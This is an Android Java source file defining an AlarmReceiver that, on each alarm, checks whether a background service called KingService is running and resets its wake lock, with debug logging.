package com.service.app.Main;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.service.app.Services.kingservice;
import com.service.app.Services.utils;
import com.service.app.defines;

public class AlarmReceiver extends BroadcastReceiver {

    utils utl = new utils();
    defines consts = new defines();
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("AlarmReceiver", "Checking KingService");
        if (!utl.startKingService(context)){
            Log.d("AlarmReceiver", "KingService is ok. Ressetting WakeLock");
            kingservice.resetWakeLock(context.getApplicationContext());
        }
    }
}
